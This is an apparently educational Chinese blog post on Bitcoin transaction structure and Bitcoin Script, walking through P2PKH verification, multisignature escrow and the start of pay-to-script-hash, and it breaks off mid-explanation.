<p>第一个交易中没有输入，因为它是区块的第一个交易，创造了新的币，Alice作为矿工获得了币，这25个币也是交易1的唯一一个输出，在之后使用1[0]来指代Alice拥有的25个币。在第二个交易中，输入是1[0]，25个币，然后产生了两个输出，2[0]是支付给Bob的17个币，2[1]是剩下的8个币，也形成了一个输出，接收方是Alice自己。在第三个交易中输入是2[0]，也即Bob的17个币，输出是3[0]，付给Carol的8个币，以及3[1]，付给Bob的9个币。在第四个交易中，输入是2[1]，也即Alice的8个币，分别支付给David和Alice。</p>
<p>使用这样的记账方式的好处是可以方便地验证交易的正确性。在验证一个交易时，我们首先找到输入所指向的交易的输出，同时为了确保它并没有被花掉，所以我们需要扫描所指向的交易区块和最新区块之间所有的区块，而不需要找到创世区块。</p>
<p>因为一个交易可以包括多个输入和多个输出，所以可以方便地实现各种目的。譬如，Bob接收到Alice的8个币，收到Carol的2个币，那么Bob可以将创建一个新的交易，将两个交易中的输出作为输入，从而将零钱合并为整钱。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233004.jpg" alt="img"></p>
<p>如果Bob和Carol要同时支付给David，那么在同一个交易中的输入可以包含Bob和Carol的币。在这种情况下， 交易生效的条件同时需要Bob和Carol两人的签名。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233005.jpg" alt="img"></p>
<h2 id="交易的语法"><a href="#交易的语法" class="headerlink" title="交易的语法"></a>交易的语法</h2><p>上面从概念上简单介绍了交易。接下来看一些细节——下面的图虽然一眼看上去有点复杂，但是已经是经过翻译之后的友好版本，毕竟所有在网络上传输的数据都是01串。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233006.jpg" alt="img"></p>
<p>hash是上一笔</p>
<p>如上图所示，交易由三部分构成：元数据、输入（多个）和输出（多个）。</p>
<p>元数据：顾名思义，元数据记录交易的基本信息，如交易的大小，交易的输入个数Vin<em>sz，</em>交易的输出个数Voutsz，以及整个交易的哈希值作为交易的唯一的ID。如果看的仔细，还能发现有一个lock_time，锁定时间，在后面会有具体的例子来介绍它的用法。</p>
<p>输入：交易的输入构成一个数组，多个输入中每一个结构都一样。因为它指定了之前的一个交易的输出，所以需要包含之前的交易的哈希值（<strong>哈希指针</strong>），同时指出该输入是之前交易的第几个输出。除此之外，每个输入还必须包括一个签名（scriptSig），这个签名就是一个凭证，证明交易的创建者确实有使用这个输出的权利。</p>
<p>输出：输出同样构成一个数组。每个输出有两个部分，value值和scriptPubkey。所有输出的value的和不能大于所有输入值的和。如果所有输出的和小于所有输入和，那么差值部分就成为矿工的交易费用。</p>
<p>现在可能有个疑问，本来是签名和公钥地址的位置出现的是scriptSig和scriptPubKey，而不是简单的Signature和PubKey。而且在scriptPubkey的地方，有一些奇怪的符号如OP_DUP，OP_Hash等。这就是接下来要介绍的比特币脚本，Bitcoin script。</p>
<p>这里要强调一下，scriptPubkey相当于是一把锁（lock），交易Tx1的创建者（如Alice）指定了只有Bob才能拿走交易Tx1的输出，那么scriptPubkey一定要能够保证确实是Bob才能使用；而Bob在创建交易Tx2的时候也必须提供锁的钥匙，就是scriptSig，证明自己。当然，scriptPubkey的锁可能是各种各样的，可以是特定身份的人；也可以是一个问题的答案，不论是谁，只要回答出来，就可以拿走output。可以看下面的例子。</p>
<h2 id="比特币脚本"><a href="#比特币脚本" class="headerlink" title="比特币脚本"></a>比特币脚本</h2><p>如上小节所见，在交易中出现了一些如OP_DUP的符号，这实际上是一种脚本。本小节将介绍比特币脚本语言，以及为何需要使用比特币脚本。</p>
<p>比特币脚本是基于栈的语言。栈允许两类操作：入栈和出栈。入栈是在栈顶部增加一个项目，出栈则是从栈顶部移除一个项目。脚本语言通过从左至右地处理每个项目的方式执行脚本。数字指令直接入栈，操作指令向堆栈推送（或移除）一个或多个参数，对它们进行处理，或者可以将结果入栈。例如，OP_ADD将从堆栈移除两个项目，将二者相加，然后再将二者相加之和推送到堆栈。</p>
<p>脚本的一个重要作用就是判断是否满足条件，譬如OP_EQUAL判断栈中的两个值是否相等，如果相等则将栈上的两个值出栈，入栈TRUE。如果最后栈的结果为TRUE，则条件满足。举一个非常简单的例子，譬如有钱任性Alice将自己的10个币写在一个交易中，然后加的锁是</p>
<p>3 OP_ADD 5 OP_EQUAL</p>
<p>之后如果有人能够给出满足这个条件的结果，也即最后的OP_EQUAL返回的结果是TRUE，那么则可以使用这10个币。在上面的这个锁中，就没有指定特定的人才能使用这个output，任何人能够提供问题的答案就行。</p>
<p>那么大家看一下，以上问题的结果应该是什么？</p>
<p>这个问题的答案是2。</p>
<p>任何一个人X在自己新创建的交易中的scriptSig中给出2这个答案，就可以使用Alice交易中的输出，也即拿走这10个币。看一下矿工打包的时候的计算过程。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233007.jpg" alt="img"></p>
<p>再举两个例子。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7   OP_ADD   3   OP_SUB   1   OP_ADD    7    OP_EQUAL</span><br></pre></td></tr></table></figure>

<p>对于上面的scriptPubkey，scriptSig应该是什么？</p>
<p>下面的例子呢？</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OP_HASH256 6fe28c0ab6f1b372c1a6a246ae63f74f931e8365e15a089c68d6190000000000 OP_EQUAL</span><br></pre></td></tr></table></figure>

<p>最常见的一种比特币交易应该就是通过签名获取之前交易的比特币输出。也即输出中应该指明“这一笔输出应该由这个公钥址所对应的私钥的拥有者使用。”但是回想一下，比特币中，交易地址实际上是公钥的哈希，而不是真正的公钥。因此，矿工并不知道公钥，从而也无法来验证签名。为了进行验证，每一个输出实际上指明的是“这一笔输出可以由哈希为x的公钥，以及公钥对应的私钥的所有者使用。”</p>
<p>为了表达这个含义，来看一下交易中的输出：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233008.jpg" alt="img">Pay-to-PubkeyHash脚本的例子</p>
<p>顾名思义，OP_DUP是duplicate复制，OPHASH160是进行哈希，69e0….串是指定的地址，OP_EQUALVERIFY是验证是否相等，以及OP_CHECKSIG是进行签名验证。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233009.jpg" alt="img"></p>
<p>那现在的问题是，第一个OP_DUP是用来复制什么呢？</p>
<p>答案就是，每一个交易的输入部分的scriptSig也是脚本。为了成功地使用之前交易的输出，我们需要将新交易的输入与之前交易的输出进行合并，然后执行合并之后的脚本，如果验证成功，则该交易是合法的；否则，这个交易就是无效的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233010.jpg" alt="img">新交易的输入签名+之前所引用交易的输出</p>
<p>比特币脚本简称就是Script，它是一种简单的基于栈的编程语言。基于栈意味着每个指令以线性的方式仅仅执行一遍。特别地，比特币脚本中没有循环。因此，脚本的指令的数量就暗示了执行脚本的时间和所用的内存的上限。该语言不是图灵完备的，也即不能执行任意复杂的操作。这也是合理的，因为矿工需要验证交易，也即矿工需要执行这些脚本，如果脚本中出现了死循环，矿工就被坑了。</p>
<p>交易的执行结果要么就是成功的，也即交易是合法的，可以被包括在区块链中；要么就是失败，也即交易是无效的，不能被包括在区块链中。</p>
<p>比特币脚本语言非常小，总共只有256个指令，因为每个指令使用一个字节来表示。其中，有15个指令现在已经禁用；75个预留的，有可能将来添加。大部分的指令是在普通的编程语言中见到的，有一些是和密码学相关的，如哈希，签名验证等。</p>
<p>下面使用一个例子来讲述如何运行脚本。</p>
<p>首先来具体看一下scriptSig的样子。下面是一个例子。</p>
<p>8c4930460221009e0339f72c793a89e664a8a932df073962a3f84eda0bd9e02084a6a9567f75aa022100bd9cbaca2e5ec195751efdfac164b76250b1e21302e51ca86dd7ebd7020cdc0601410450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6</p>
<p>它实际上是由四（五）个部分构成：</p>
<p>&lt;One-byte script OPCODE containing the length of the DER-encoded signature plus 1 (the length of the one-byte hash code type)&gt;|&lt; The actual DER-encoded signature plus the one-byte hash code type&gt;|&lt; One-byte script OPCODE containing the length of the public key&gt;|<The actual public key></p>
<p>8c：一个字节指示整个签名（scriptSig）的长度，共140字节</p>
<p>49：一个字节指示实际签名（DER-encoded）的长度（本例中72）加上一个字节的哈希类型SIGHASH_ALL（0x01），共73字节；73&#x3D;72+1</p>
<p>签名：30460221009e0339f72c793a89e664a8a932df073962a3f84eda0bd9e02084a6a9567f75aa022100bd9cbaca2e5ec195751efdfac164b76250b1e21302e51ca86dd7ebd7020cdc06（72字节），然后紧跟着01，sighash类型</p>
<p>41：一个字节指示公钥的长度，共65字节</p>
<p>公钥：0450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6（65字节）</p>
<p>也即，从新交易的scriptSig中可以获得对应着下图中的第一部分和第二部分。</p>
<p>下图实际上是从左向右逐步执行脚本中每一个指令的过程。上部是栈的变化，下部分是执行的具体指令。</p>
<p>sig和pubKey是两条数据指令，当遇到数据指令时，直接入栈；所以将新交易的输入中的scriptSig部分中的签名部分和公钥部分入栈。后面五条指令中除pubKeyHash外都是操作指令，基于栈的语言从栈顶获得输入，然后将结果入栈。所以第一条Dup复制指令直接把pubkey复制了一份；Hash160指令对pubkey进行哈希，将结果入栈；然后然后接下来是数据指令将新交易所引用的交易的输出中的公钥哈希入栈，然后是比较指令，比较栈顶的两个元素是否相等，如果相等弹出，如果不等则报错。最后是checksig，使用public key来验证签名。如果验证成功，那么栈顶的两个元素出栈，然后结果True入栈。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233011.jpg" alt="img"></p>
<p>现在我们用一个例子再详细地过一遍这个过程。之前的交易Tx1，也即新交易中的输入的来源，我们假设是Alice支付给Bob的交易；新交易Tx2，也即Bob需要使用他在Tx1中获得的币。</p>
<p>为了验证这个交易的合法性，矿工要能够验证Bob确实可以使用Tx1中的输出。如何证明呢？首先就是因为Alice在Tx1交易中的scriptPubKey中，明确指定了一个哈希地址，这个哈希地址就是Bob的公钥的哈希。Bob为了证明自己就是这笔输出的合法主人，他必须提供身份信息，也即，在Tx2的输入部分的scriptSig中他提供了签名和完整的公钥，签名是使用私钥对交易的签名。</p>
<p>然后矿工开始执行验证过程。矿工将Tx2的scriptSig部分和Tx1的scriptPubKey部分简单的拼在一起，然后执行每一条指令。</p>
<p>首先是<sig>指令，这是数据指令，是来自于Bob的签名，也即Tx2的中scriptSig的第一部分，入栈。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233012.jpg" alt="img"></p>
<p>接下来是<pubkey>，同样是数据指令，是来自于Bob的完整公钥，也即Tx2的中scriptSig的第二部分，入栈。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233013.jpg" alt="img"></p>
<p>第三条指令是OP_DUP，这是来自Tx1的Alice的输出的scriptPubKey，OP_DUP添加到堆栈，因为是复制，所以把当前栈顶的数据复制一份放到栈顶，这样把BOB提供的公钥复制了一份。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233014.jpg" alt="img"></p>
<p>第四个指令是OP_HASH160，入栈，对下面的数据，也即Bob的公钥进行两次哈希（SHA-256以及RIPEMD-160），把自己替换掉。这样就获得了Bob公钥的哈希值。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233015.jpg" alt="img"></p>
<p>第五条指令是数据指令，<pubkeyhash>，同样来自于交易Tx1，Alice指定的的输出地址，入栈。这样栈顶就有两份哈希值了。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233016.jpg" alt="img"></p>
<p>下一条指令稍微复杂点，OP_EQUALVERIFY，入栈，相当于展开成EQUAL和VERIFY两个操作。EQUAL的操作是检查它下面的两个值是否相等，这里，也即检查Alice指定的地址（栈顶）和Bob提供的完整公钥生成的哈希（栈顶第二个）是否相等。EQUAL会得到0(false)或者1(true)。VERIFY检查EQUAL的返回值，如果是false，则交易非法，如果是true，则将自己和true出栈。这里，是为true的情况。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233017.jpg" alt="img"></p>
<p>最后一条指令是OP_CHECKSIG入栈，对栈中的两个元素进行检查，当前栈中的数据实际就是Bob的输入中提供的完整公钥和对应私钥的签名，如果验证通过则True入栈。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233018.jpg" alt="img"></p>
<p>以上就是一个正确的Pay-to-PubKeyHash（P2PKH）的例子。</p>
<p>另外要注意一点细节就是如何使用公钥来验证签名。也即，这个签名是怎么产生的？签名是对什么的签名？我们知道签名实际上就是使用私钥对一段明文进行加密，那这里的明文是什么？这里的问题是，首先，这段明文是矿工能够访问的，不然无法验证；其次，<strong>这段明文必须是唯一的，不然Bob之前的签名可能被攻击者复制进行重放。</strong> 要确保这笔交易谁都不法篡改（矿工可能会篡改你的交易内容，把收钱的地址设置为自己的）。</p>
<p>这里答案就是整个交易Tx2。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233019.jpg" alt="img"></p>
<p>确切地说，就是交易Tx2的除了签名部分之外的内容（可以通过标志位对进行签名的交易内容进行简化，在这个例子中，使用pubkey Script替代Signature做填充）。上图共有三个部分，中间是Signed Data，也即被签名的数据。上部是Tx1和Bob自己的数据，下部分是Bob最终形成的Tx2。从上部分和中间部分形成了下部。（签名的另一个好处是，Tx2的明文部分也不能被攻击者随意篡改）</p>
<p>更多细节可以参考<a href="https://link.zhihu.com/?target=https://bitcoin.stackexchange.com/questions/3374/how-to-redeem-a-basic-tx">How to redeem a basic Tx?</a></p>
<p>以及<a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/OP_CHECKSIG">OP_CHECKSIG - Bitcoin Wiki</a></p>
<p>最后，有两个问题可以讨论一下：</p>
<ol>
<li>在验证过程中，最后一步OP_CHECKSIG的输入实际上就是在新交易中Bob提供的scriptSig的两个部分，最后一步的验证也就是在验证Bob的私钥。那中间还有那么多步骤能不能省略呢？</li>
</ol>
<p>【一些同学会认为，Bob必须提供一个地址，使得其哈希值等于前交易中指定的值；但是如果这个地址之前使用过，任何人都可以提供这个地址。】</p>
<ol start="2">
<li>在引入比特币地址（公钥的哈希）之前，早期的比特币版本支持p2pk形式的交易，也即pay-to-public-key。这种交易的缺点是需要提前知道公钥，而且针对攻击的保护性较差【如果一个地址只用一次，那么P2PKH的话没有人提前知道公钥】。问题是：这种交易的scriptSig和scriptPubKey应该怎么写？</li>
</ol>
<hr>
<p>关于p2pk和p2pkh，课后有同学问，为啥没有人提前知道公钥会更安全？参考4提供了一个解释：</p>
<p>在比特币使用的椭圆曲线数字签名算法加密系统里面，一个公钥有512位长度，意味着它需要接近100个字符来呈现。举个例子，下面是一个公钥：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">04b52fd5a616a8f08ccad58469102f86fc7891e5aa4262ab8d43e41767c17d45b80850044a62af51783609176daf02fc46221057a8de11ee6ae8743065b27a4b5e</span><br></pre></td></tr></table></figure>

<p>它对应的十六进制形式的比特币地址如下： </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4b463093e6fc3135a4de2ff577c4b658198777a9</span><br></pre></td></tr></table></figure>

<p>人们更加熟悉的base58编码形式的是： </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1obodiqhAZ3GD9onBXRZ9v7hshkuBreCu</span><br></pre></td></tr></table></figure>

<p>然而，在现实里，有一种以更紧凑的形式编码公钥的方法，只需要257个字节（译者注：这里好像有点问题，应当是257位，参见此文<a href="https://link.zhihu.com/?target=http://618.io/blog/2013/07/30/bitcoin-basic/">http://618.io/blog/2013/07/30/bitcoin-basic/</a>）： </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03c5c9833d00bed3211a5f3733316ecf6ebc407806d70caa14862f1e2e8c2f852d</span><br></pre></td></tr></table></figure>

<p>如果我们决定把它变成base58编码的形式： </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15sqRCowBDTfyuxPQD3ba8sN3wBB8MwGbo6gsBEGeKmUbNQADGh</span><br></pre></td></tr></table></figure>

<p>比我们如今使用的地址也没长多少。所以中本聪的选择【p2pkh是中本聪做出的选择】只是带来了不必要的复杂度和浪费吗？</p>
<p>最后证明，答案是否定的。有另外一个非常好的理由去使用这个“公钥的哈希值”的地址结构：量子加密技术。量子计算机可以破解椭圆曲线数字签名算法（也就是说，给定一个公钥，量子计算机可以相当快速的找到对应的私钥），但它们不能相类似的逆转哈希算法（或者说他们可以，但是将需要花掉280个步骤来完成一个比特币地址的破解，这仍然是相当不可行的）。因此，如果你的比特币资金存放在一个你没有支出过的地址里（这意味着公钥是没有公开的），它们在量子计算机面前也就是安全的。有理论上的途径可以让比特币完全免于量子计算机的威胁，但一个地址只是一个公钥的哈希值的事实，意味着一旦量子计算机真的出现了，在我们全面切换之前攻击者可以造成的损失要小得多。</p>
<p>【至于为啥量子计算可以破解ECC但是不能不能逆转哈希，需要进一步的分析了】</p>
<p>参考：</p>
<ol>
<li><p><a href="https://link.zhihu.com/?target=http://8btc.com/article-4382-1.html">深入理解比特币交易的脚本 - 新手入门</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://bitcoin.org/en/developer-guide%23transactions">https://bitcoin.org/en/developer-guide#transactions</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Transaction">Transaction - Bitcoin Wiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://m.8btc.com/article/5340">https://m.8btc.com/article/5340</a></p>
</li>
</ol>
<h1 id="区块链技术8-比特币的机制-2"><a href="#区块链技术8-比特币的机制-2" class="headerlink" title="区块链技术8:比特币的机制(2)"></a>区块链技术8:比特币的机制(2)</h1><h2 id="OP-CHECKMULSIG"><a href="#OP-CHECKMULSIG" class="headerlink" title="OP_CHECKMULSIG"></a>OP_CHECKMULSIG</h2><p>和OP_CHECKSIG相比，OP_CHECKMULSIG多了个MUL，也即它需要检查多个签名。这个指令并不是比特币设计之初就有的，而是在2011年的BIP（bitcoin  improvement protocol）中提出的（详见参考1）。</p>
<p>提出该指令的目的是使能安全钱包、托管交易、以及其他需要多于一个签名的使用情况。举例来说，可以使用的例子包括：</p>
<ul>
<li>使用WPS（wallet protection service）保护的钱包。譬如需要2-of-2的签名的交易，其中一个签名来自于安装了钱包的（可能不安全的）电脑，另一个签名来自WPS。当发送受保护的比特币时，用户的比特币客户端会将交易发给WPS，WPS会向用户请求确认，譬如用户确实发起了这个交易，以及交易的细节是正确的。 Two-factor authentication wallet - One private key is on your primary computer, the other on your smartphone — the funds cannot be spent without a signature from both devices. Thus, an attacker must gain access to both devices in order to steal your funds (much more difficult than one device)。Side note: customers should insist that their wallet protection service provide them with copies of the private key(s) used to secure their wallets that they can safely store off-line, so that their coins can be spent even if the WPS goes out of business。</li>
<li>组织资金使用：2-of-3的情况，由三名董事组成的董事会，为他们的组织维护资金-除非其中两名董事同意，否则不得动用这些资金。 较大的组织可以进行更大的多重签名交易，例如3-of-5, 5-of-9等。</li>
<li>第三方托管服务（买方、卖方、以及信任第三方 Escrow transaction）。适用于需要2-of-3签名的交易。买方、卖方和第三方没人都提供公钥，买方将创建交易，并使用2-of-3 CHECKMULTISIG，然后将交易ID发送给卖方和第三方。卖方履行自己的责任，然后要求买方共同签名，才能获得支付的币。如果买卖双方起了争执，则第三方会参与进来，譬如如果买方收到货却不肯签名，那么第三方将进行签名，这样满足条件，从而卖方可以获得应得的报酬。</li>
</ul>
<p>关于第三方托管的例子，详细来说，譬如Alice想要使用比特币向Bob购买一些物品。问题是，Alice希望在收到物品之后才付钱，而Bob希望收到钱之后才发货。这时候就需要第三方托管（支付宝）。而第三方托管可以通过MultiSig方便地实现。</p>
<p>Alice和Bob同意找到信任的第三方Carol。然后Alice创建了交易。但是这个交易不是直接发给Bob的，而是一个MULTISIG的交易，需要2-of-3的签名。也即，Alice将自己的币发给了一个地址，要求Alice、Bob以及Carol三人中任意两人的签名才能使用这个输出。</p>
<p>这个交易首先是正常的交易，因为Alice确实拥有这个币。然后如果Alice和Bob都是诚实的，也即Bob看到Alice创建的交易之后便发货，而Alice收到货之后也承认收到货，那么为了使用MULTISIG交易中的币，只要Alice和Bob两人签名就可以创建一个新的交易，这个交易的输入是MULTISIG交易中的输出，输出则是Bob的地址，那么Bob就能获得币。此时，并不需要第三方Carol的参与。</p>
<p>如果Alice不诚实，也即收到货了又不承认，此时Bob可以向Coral申请仲裁，如果Coral相信Bob确实发了货，那么Coral可以和Bob两人创建新的交易，将币从MULTISIG交易中赎出，并且输出是Bob的地址。这样Bob也能够获得币。即使Alice想抵赖也不能成功。</p>
<p>如果Bob不诚实，没有发货或者发的货物不对，那么Alice可以向Carol申请仲裁。如果Carol相信了Alice，那么就可以和Alice一起签名，将币从MULTISIG交易中赎出，并且输出是Alice的地址。这样Alice就能够获得退款。即使Bob想抵赖也不能成功。</p>
<p>【此时的Carol既然可以进行仲裁，那么就是一个中心化的机构。那么本质上和支付宝也没什么区别。】</p>
<p>【百度百科上的“去中心化”的描述：去中心化，不是不要中心，而是由节点来自由选择中心、自由决定中心。简单地说，中心化的意思，是中心决定节点。节点必须依赖中心，节点离开了中心就无法生存（类似于没了支付宝就不能用淘宝？）。在去中心化系统中，任何人都是一个节点，任何人也都可以成为一个中心。任何中心都不是永久的，而是阶段性的，任何中心对节点都不具有强制性。】</p>
<p>MULTISIG的规范如下：</p>
<p>scriptPubKey 中包括的内容：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m &#123;pubkey&#125;...&#123;pubkey&#125; n OP_CHECKMULTISIG</span><br></pre></td></tr></table></figure>

<p>m的值小于或等于n。</p>
<p>OP_CHECKMULTISIG交易赎出币时需要如下的scriptSig:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OP_0 ...signatures...</span><br></pre></td></tr></table></figure>

<p>这里需要OP_0是因为OP_CHECKMULTISIG中存在Bug，它在实现的时候多出栈了一个元素，所以只好使用OP_0进行填充。</p>
<p>再具体看一下MULTISIG的运行情况。</p>
<p>譬如说赎出币的交易中（新交易Tx2）的scriptSig是这样的：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(sig2)</span><br><span class="line">(sig1)</span><br><span class="line">    0</span><br></pre></td></tr></table></figure>

<p>MultiSig交易（Tx1）中的输出部分的scriptPubKey是这样的：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">(pubKey3)</span><br><span class="line">(pubKey2)</span><br><span class="line">(pubKey1)</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>当运行时，在 OP_CHECKMULTISIG执行之前，栈中的数据是这样的：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">(pubKey3)</span><br><span class="line">(pubKey2)</span><br><span class="line">(pubKey1)</span><br><span class="line">2</span><br><span class="line">(sig2)</span><br><span class="line">(sig1)</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>初始化之后，各个变量获得了值：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n-&gt;    3</span><br><span class="line">ikey-&gt; (pubKey3)</span><br><span class="line">       (pubKey2)</span><br><span class="line">       (pubKey1)</span><br><span class="line">m-&gt;    2</span><br><span class="line">isig-&gt; (sig2)</span><br><span class="line">       (sig1)</span><br><span class="line">       0</span><br></pre></td></tr></table></figure>

<p>然后首先尝试使用pubKey3来验证sig2, 很明显会失败，那么将ikey朝前走一步指向pubKey2，isig保持不动：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n-&gt;    3</span><br><span class="line">       (pubKey3)</span><br><span class="line">ikey-&gt; (pubKey2)</span><br><span class="line">       (pubKey1)</span><br><span class="line">m-&gt;    2</span><br><span class="line">isig-&gt; (sig2)</span><br><span class="line">       (sig1)</span><br><span class="line">       0</span><br></pre></td></tr></table></figure>

<p>使用pubKey2验证sig2成功了，然后ikey和isig都向前:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n-&gt;    3</span><br><span class="line">       (pubKey3)</span><br><span class="line">       (pubKey2)</span><br><span class="line">ikey-&gt; (pubKey1)</span><br><span class="line">m-&gt;    2</span><br><span class="line">       (sig2)</span><br><span class="line">isig-&gt; (sig1)</span><br><span class="line">       0</span><br></pre></td></tr></table></figure>

<p>基本算法如下：</p>
<ol>
<li>首先弹出n,n是公钥的个数</li>
<li>出栈n个公钥</li>
<li>出栈 m, m是所需的签名的个数</li>
<li>出栈 m个签名</li>
<li>将OP_0出栈（历史遗留问题）</li>
<li>对公钥可以循环，从最上面的开始，对每一个公钥，检查一个签名。都从最上的开始，如果失败，则使用下一个公钥来检查同一个签名；如果成功，则使用下一个公钥来检查下一个签名（签名必须和公钥的顺序相同）。</li>
<li>如果签名成功，则CHECKMULTISIG返回1，否则返回0。</li>
</ol>
<p>以上部分是对MULTISIG的介绍，下面将介绍P2SH，顺便用一下MULTISIG。</p>
<h2 id="P2SH（pay-to-script-hash"><a href="#P2SH（pay-to-script-hash" class="headerlink" title="P2SH（pay-to-script-hash)"></a>P2SH（pay-to-script-hash)</h2><p>之前我们介绍了两种交易类型P2PKH和P2PK，现在来讨论一种新的交易类型，pay-to-script-hash。顾名思义，pay-to-script-hash就是把币发到一个脚本的哈希，而不是公钥或者公钥哈希。</p>
<p>典型的比特币地址长得像<em>15Cytz9sHqeqtKCw2vnpEyNQ8teKtrTPjp</em>，也是Pay-to-PubKeyHash (P2PKH) 的输出脚本中所用的地址。Pay-to-ScriptHash (P2SH) 长的和用的都不一样。典型的P2SH地址像<em>347N1Thc213QqfYCz3PZkjoJpNv5b14kBd</em>，另外，P2SH 总是以3开头的，而P2PKH地址总是以1开头。这是因为P2SH地址的版本前缀是<em>0x05，</em> 而P2PKH的地址前缀是<em>0x00</em>, 在<a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Base58Check_encoding">base58check</a>编码中分别生成3和1。</p>
<p>和MULTICHECKSIG一样，P2SH也不是比特币诞生之初就有的，它是2012年的BIP 16中提出的。提出P2SH的目的主要是因为在之前的交易中，都是由发送者负责指定赎出币的条件。这样的话，如果赎出币的过程比较复杂，譬如要使用MULTISIG，那么对付钱的用户，也就是买家，就不够友好。使用P2SH的方式，可以由币的接收方设计好执行的脚本，然后不论脚本多么复杂，发送方只需要将币发送到一个20字节的哈希地址就行。</p>
<p>譬如Alice向Bob购买一件物品，但是Bob的物品不是自己独有的，他需要和其他人一起分享Alice付的币，就例如上面介绍的MULTICHECK，需要3个人中的两人同意才能使用币。把这个任务交给Alice是不合理的，因为Alice只关心自己付了钱能够拿到物品，并不关心Bob拿到钱之后怎么分。这个时候Bob可以创建一个Script，然后Alice可以将币发送到这个Script地址。</p>
<p>我们来看一下P2SH的规范：</p>
<p>在支付用户的交易Tx1中的输出脚本是：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OP_HASH160 [20-byte-hash-value] OP_EQUAL</span><br></pre></td></tr></table></figure>

<p>其中，[20-byte-hash-value]是push-20-bytes-onto-the-stack opcode (0x14) 之后跟着20个字节。考虑到验证时是将Bob的签名脚本+Alice的输出脚本，所以基本上可以猜出，在OP_HASH160之前，栈里应该是Bob提供给Alice的脚本的原文，然后Alice的输出脚本中的SH也入栈，最后是运行OP_EQUAL，判断是否相等。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233020.jpg" alt="img"></p>
<p>然后接收方Bob要提取币的时候，scriptSig的形式应该是:</p>
